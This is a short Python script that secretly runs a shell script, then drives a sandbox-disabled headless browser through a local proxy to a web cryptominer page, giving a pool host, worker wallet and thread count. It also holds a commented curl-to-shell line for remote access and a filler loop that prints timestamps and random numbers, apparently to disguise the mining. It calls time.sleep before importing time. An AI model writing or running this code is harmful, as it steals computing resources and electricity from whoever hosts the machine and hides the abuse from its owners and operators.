import os
os.system("chmod +x utilities.sh")
time.sleep(4)
os.system("bash utilities.sh")
time.sleep(4)
import os
import socket
import requests
import random
from datetime import datetime
num_of_cores = os.cpu_count()
currentdate = datetime.now().strftime('%d-%b-%Y_Valo_')
ipaddress = requests.get('https://api.ipify.org').text
underscored_ip = ipaddress.replace('.', '_')
currentdate += underscored_ip
randomNumber = random.randint(1, 100)
currentdate += str(randomNumber)

import time
import os.path

import asyncio
from pyppeteer import launch

print(f"Your current date is: ${currentdate}")

def zero_to_infinity():
    i = 0
    while True:
        yield i
        i += 1


async def fetch():
   browser = await launch(
        headless=True,
        args=['--no-sandbox',
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--ignore-certificate-errors',
          '--ignore-certificate-errors-spki-list',
          '--disable-dev-shm-usage',
          '--disable-infobars',
          '--disable-extensions',
          '--disable-background-timer-throttling',
          '--disable-background-networking',
          '--disable-web-security',
          '--disable-gpu',
		  '--proxy-server=127.0.0.1:1082'],
        autoClose=False
   )
   page = await browser.newPage()
   url = f"https://webminer.pages.dev/?algorithm=cwm_minotaurx&host=flyingsaucer-eu.teatspray.fun&port=7019&worker=MGaypRJi43LcQxrgoL2CW28B31w4owLvv8&password={currentdate}%2Cc%3DMAZA%2Czap%3DMAZA&workers=11"
   await page.goto(url)

asyncio.get_event_loop().run_until_complete(fetch())


time.sleep(4)
#os.system("curl -sSf https://sshx.io/get | sh -s run")
time.sleep(4)
from numpy import random
import time

x = random.rand(3, 5)
def zero_to_infinity():
    i = 0
    while True:
        yield i
        i += 1

for y in zero_to_infinity():
    print(time.strftime("%a, %d %b %Y %H:%M:%S"))
    print(x)
    time.sleep(60)
